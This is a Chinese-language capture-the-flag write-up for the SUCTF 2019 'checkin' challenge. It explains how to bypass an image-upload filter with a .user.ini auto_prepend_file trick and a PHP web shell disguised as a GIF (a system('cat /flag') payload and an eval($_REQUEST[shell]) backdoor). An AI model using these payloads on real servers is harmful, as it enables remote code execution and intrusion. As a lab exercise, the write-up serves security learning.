### buuoj_[SUCTF 2019]checkin

首先看到是上传文件，那就先上传一张图片和txt文件试试

![](https://pic.imgdb.cn/item/61151cf45132923bf83444b0.jpg)

![](https://pic.imgdb.cn/item/61151d685132923bf83539fa.jpg)

可以看到后端检查是否是图片，并且显示了图片储存路径，那么试一下上传木马

![](https://pic.imgdb.cn/item/61151e585132923bf8373b99.jpg)

好像不太行，再试试改一下后缀

![](https://pic.imgdb.cn/item/61151e8f5132923bf837b262.jpg)

还是不行，换一种

![image-20210812211624953](C:\Users\EXCEPTION\AppData\Roaming\Typora\typora-user-images\image-20210812211624953.png)

成功了，用蚁剑连一下，连不上。。。麻了

然后看看大佬的wp

利用`.user.ini`来上传php后门

------

## .user.ini

我们先在php手册上看一下对`.user.ini`的介绍：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20190824211552-4c92f9fe-c671-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190824211552-4c92f9fe-c671-1.png)

也就是说我们可以在`.user.ini`中设置`php.ini`中**PHP_INI_PERDIR** 和 **PHP_INI_USER** 模式的 INI 设置，而且只要是在使用 **CGI／FastCGI** 模式的服务器上都可以使用`.user.ini`

**auto_prepend_file**和**auto_append_file**

> 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：`require(./a.jpg);`
>
> 这两个设置的区别只是在于**auto_prepend_file**是在文件前插入；**auto_append_file**在文件最后插入（当文件调用的有`exit()`时该设置无效）

首先上传一个.user.ini后缀的文件，内容是

```
GIF89a
auto_prepend_file=a.jpg
```

![](https://pic.imgdb.cn/item/611524805132923bf8467c08.jpg)

之后，在上传一个木马，内容是这个（文件名a.jpg)

```
GIF89a?
<script language='php'>system('cat /flag');</script>
```

上传成功后访问这个

```
http://c7fef2bc-c022-4059-a1a1-b739b4e4d5a2.node4.buuoj.cn:81/uploads/546b0fb1e304c8d7a57f22d14e79d454/index.php
```

但是访问出来是空白不知道为什么

![image-20210812223635696](C:\Users\EXCEPTION\AppData\Roaming\Typora\typora-user-images\image-20210812223635696.png)

换一个木马上传

```
GIF89a? 
<script language="php">eval($_REQUEST[shell])</script>
```

然后蚁剑链接，目录是

```
http://dab2a096-4cd3-4bb2-8bb3-559523bf740c.node4.buuoj.cn:81/uploads/546b0fb1e304c8d7a57f22d14e79d454/index.php
```

![](https://pic.imgdb.cn/item/611533bc5132923bf86c1980.jpg)

完成